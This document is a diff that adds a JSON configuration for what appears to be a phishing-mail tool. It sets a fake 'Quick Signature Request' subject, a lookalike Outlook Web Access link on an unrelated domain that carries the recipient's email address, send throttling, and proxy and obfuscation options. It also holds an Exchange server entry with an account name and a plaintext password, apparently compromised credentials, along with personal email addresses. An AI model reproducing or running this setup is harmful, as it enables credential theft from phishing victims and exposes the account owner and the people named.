@@ -1,0 +1,46 @@
+{
+      "use_single_smtp": false,
+  "single_smtp": "",
+  "single_smtp_sender_email": "anna.lakatos@lagence.com",
+  "use_tls": true,
+  "smtp_sleep_time": 7,
+  "smtp_pause_num": 8,
+  "sender_names": [
+ "Steven Bass"
+ 
+ ],
+  "repply_to": "info@nunez.io",
+  "subjects": [
+"Quick Signature Request: Please Review and Sign #{RECIPIENT_DOMAIN_NAME}"
+    
+],
+  "links": [   
+  "https://east-exch02910-serverdata-net.geodjs.com/owa#{RECIPIENT_EMAIL}"
+
+  ],
+  "format_type": "F1",
+  "send_attachment": false,
+  "attachment_path": "Attach/message.html",
+  "convert_to_pdf": false,
+  "hide_sender": false,
+  "use_qrcode": false,
+  "qrcode_color": "black",
+  "qrcode_bg_color": "white",
+  "qrcode_logo": "gray",
+  "use_html_to_image": false,
+	"format_folder": "absolute/path/to/folder",
+  "email_priority": "high",
+  "use_exchangelib": true,
+  "exchange_server": "west.exch081.serverdata.net|MFish@thegrandhealthcare.com|Winter@2020#",
+  "use_proxy": false,
+  "proxy_list_file": "proxies/ip.txt",
+  "use_eml": false,
+  "eml_template_path": "templates/template.eml",
+  "html_template_path": "format/message.html",
+  "eml_encrypted": false,
+  "eml_obfuscated": false,
+  "use_pgp": false,
+  "pgp_recipient_key": "recipient@example.com",
+  "html_to_pdf": false,
+  "html_to_word": false
+}
